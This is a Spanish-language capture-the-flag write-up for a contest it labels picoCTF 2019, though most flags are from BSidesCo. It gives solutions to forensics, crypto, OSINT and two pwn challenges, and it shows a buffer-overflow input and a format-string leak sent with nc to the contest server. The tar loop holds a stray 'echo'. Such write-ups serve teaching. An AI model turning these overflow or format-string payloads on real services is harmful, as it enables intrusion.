# picoCTF 2019


 - [picoCTF CTF 2019](#bsidesco-2019)
   - [Forensics](#forensics)
     - [like1000](#like1000)
     - [Robando Secretos Antiguos 1](#robando-secretos-antiguos-1)
     - [Exorcismo 1](#exorcismo-1)
   - [misc](#misc)
     - [Pasado](#pasado)
   - [pwn](#pwn)
     - [Incontinencia](#incontinencia)
     - [Magia magia](#magia-magia)
   - [web](#web)



## Forensics

### like1000

This .tar file got tarred alot. Also available at /problems/like1000_0_9b2adbe4c49cbb2e2ca9bb5926448dfe.

La pista del reto es: 
**Try and script this, it'll save you alot of time**

```console
for i in echo {1000..1..1} 
do tar xf $i.tar
done
```
La flag es: 

**_picoCTF{l0t5_0f_TAR5}_**


### Robando Secretos Antiguos 1

El reto dice **_Un amigo logró robar un secreto pero necesitamos alguien que lo descifre._** y ofrece dos archivos **mensaje** y **secreto_4w0rH5o**

Revisando los dos archivos conocemos que **mensaje** es data y  **secreto_4w0rH5o** es una llave privada RSA

```console
oscar@asgard:~/WORKSPACE/ctf/bsides$file mensaje                  
mensaje: data
```

```console
oscar@asgard:~/WORKSPACE/ctf/bsides$file secreto_4w0rH5o                  
secreto_4w0rH5o: PEM RSA private key
```

Usando OpenSSL podemos decifrar el mensaje


```console
oscar@asgard:~/WORKSPACE/ctf/bsides$openssl rsautl -decrypt -in mensaje -out mensaje.txt -inkey secreto_4w0rH5o                  
```
Revisando el contenido de **mensaje.txt** encontramos la bandera:

**_BSidesCo{uN_s3Cr3T0_P0c0_S3cR3t0}_**

### Exorcismo 1

En este reto nos dan el archivo **secreto**

```console
oscar@asgard:~/WORKSPACE/ctf/bsides$cat secreto 
010100000011001001001010011011000110001001101100010011000111010101000111001101000110001000110000011100100011000001010000011011000110011101111010010010010111010001011010011000100011000101100111001100100110011101001011011100000100110001000111

000100100110000100100011000010000000011100011111000011110001101000111100010101110011000001001001000000100110010001100000001100110000010001001110001001010100011100110100000101100000010100001010000000110000001000100101000001000111110000111010
```

La pista del reto es: **_eXORcismo, así o más explícito? ;)_**

Usando una [calculadora XOR online](https://xor.pw/) con los dos bloques como input y calculando la salida como ASCII(base 256) se obtiene la bandera:

**_BSidesCo{cRypT0_c4l3nt4m1ent0}_** 

## misc

### Pasado

El reto nos pide la URL del formulario que se debía llenar para proponer una charla para el BSidesCo del año 2016.

La pista del reto es: **_La bandera no sigue el formato, es la URL._**

Buscando en [Way Back Machine](https://web.archive.org/) la url _bsidesco.org_ se puede ver un snapshot del sitio del 20 de junio de 2016.

En el link **Enviar Paper** se puede encontrar la URL del form.

**_https://bsidesco.typeform.com/to/qKrnSF_** y esa es la bandera

## pwn

### Incontinencia

```console
oscar@asgard:~/WORKSPACE/ctf/bsides$python -c "print 'Y'*10" | nc -v retos.bsides.ctf.co 
Connection to retos.bsides.ctf.co 31332 port [tcp/*] succeeded!
====================|==|====================
SERVICIO DE CORREO SIN MEDIDA
Usuario     : Rodolfo
Bandeja     : 1 nuevo correo
====================|==|====================

Se requiere una clave para observar el correo...
ADVERTENCIA: SE RECOMIENA UNA CLAVE DE 7 DIGITOS
Entre su clave: 
Cargando la bandeja...

Email 1: From (sedisb@anon44f8zh7c8a.onion)
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
I'll be sending out invitations shortly. Will most likely host
the recruitment site on the dark web. Was wondering if you had
any good suggestions for the recruitment challenge. Thanks.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v3.3.7 (MingW32)
iD8DBQFFxqRFCMEe9B/8oqEaE5RtJ91Tx4RziVzY4eR4Ms4MFsKAMqOoQCgg7y6
e5AJIRuLUIUikjNWQIW63QE=
=aAhr
-----END PGP SIGNATURE-----
Email 1: End

BSidesCo{GO0O0O0v3rfl0W}
oscar@asgard:~/WORKSPACE/ctf/bsides$
```

La bandera es:

**_BSidesCo{GO0O0O0v3rfl0W}_**

### Magia magia

```console
oscar@asgard:~/WORKSPACE/ctf/bsides$nc -v retos.bsides.ctf.co 31333
Connection to retos.bsides.ctf.co 31333 port [tcp/*] succeeded!
Prueba que eres mago y lees mentes!
Primero dime tu nombre (hasta 10 letras): 
%x.%x.%x
Estoy pensando un numero entre 0 y 1000000, puedes decirme cual es?
a192a284.5db.7433f
has tu prediccion: 475967
Sorprendente! Aca esta la bandera: BSidesCo{m4gi4_MAG1a-b5G_BU6}

oscar@asgard:~/WORKSPACE/ctf/bsides$
```

La bandera es:

**_BSidesCo{m4gi4_MAG1a-b5G_BU6}_**


## web
